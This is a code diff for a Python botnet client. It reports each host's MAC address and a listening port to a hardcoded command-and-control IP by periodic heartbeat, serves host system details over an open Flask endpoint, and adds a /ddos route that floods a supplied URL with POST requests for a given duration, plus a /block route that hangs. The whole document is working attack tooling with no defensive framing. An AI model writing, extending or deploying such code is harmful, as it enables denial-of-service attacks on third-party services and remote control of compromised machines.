@@ -1,23 +1,30 @@
 from flask import Flask, request
-import re
-import uuid
 import platform
 import psutil
+import getmac
 import json
 import socket
 import requests
 import threading
+import time
 
 cnc_ip = '10.0.2.15'
 
 def main():
     port = getFreePort()
-    server = Server(port)
+    server = FlaskServer(port)
     threading.Thread(target=lambda: server.run()).start()
     body = {}
     body['mac-address'] = getMacAddress()
     body['running-port'] = port
-    requests.post(f"http://{cnc_ip}:5000/register", json=body)
+    body['starting-up'] = True
+    while True:
+        try:
+            requests.post(f"http://{cnc_ip}:5000/heartbeat", json=body, timeout=5)
+            body['starting-up'] = False
+        except Exception:
+            pass
+        time.sleep(60)
 
 def getFreePort():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -27,16 +34,16 @@ def getFreePort():
     return port
 
 def getMacAddress():
-    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    return getmac.get_mac_address()
 
-class Server:
+class FlaskServer:
     app = Flask(__name__)
     port = None
     def __init__(self, port):
         self.port = port
 
     def run(self):
-        self.app.run(host="0.0.0.0", port=self.port, threaded = True, debug = False, use_reloader = False)
+        self.app.run(host="0.0.0.0", port=self.port, threaded = False, debug = False, use_reloader = False)
 
     @app.route('/systeminfo', methods = ['GET'])
     def getSystemInfo():
@@ -47,22 +54,33 @@ class Server:
         info['architecture'] = platform.machine()
         info['hostname'] = socket.gethostname()
         info['mac-address'] = getMacAddress()
-        info['processor'] = platform.processor()
+        with open('/proc/cpuinfo', 'r') as f:
+            for line in f:
+                if line.startswith('model name'):
+                    info['processor'] = line.split(':')[1].strip()
         info['ram'] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-        info['processor'] = platform.processor()
         return json.dumps(info)
 
-    @app.route('/sendhttprequest', methods = ['POST'])
+    @app.route('/ddos', methods = ['POST'])
     def sendRequest():
         json = request.get_json()
 
         url = json['url']
-        headers = json['headers']
-        body = json['body']
+        timeSeconds = int(json['timeSeconds'])
+        start_time = time.time()
+        while time.time() - start_time < timeSeconds:
+            try:
+                requests.post(url, json={}, timeout=5)
+            except Exception:
+                pass
 
-        response = requests.post(url, headers=headers, json=body)
-
-        return response.json()
-
+        return "", 200
+    
+    @app.route("/block")
+    def block():
+        print("xd")
+        while(True):
+            continue
+        
 if __name__ == "__main__":
     main()
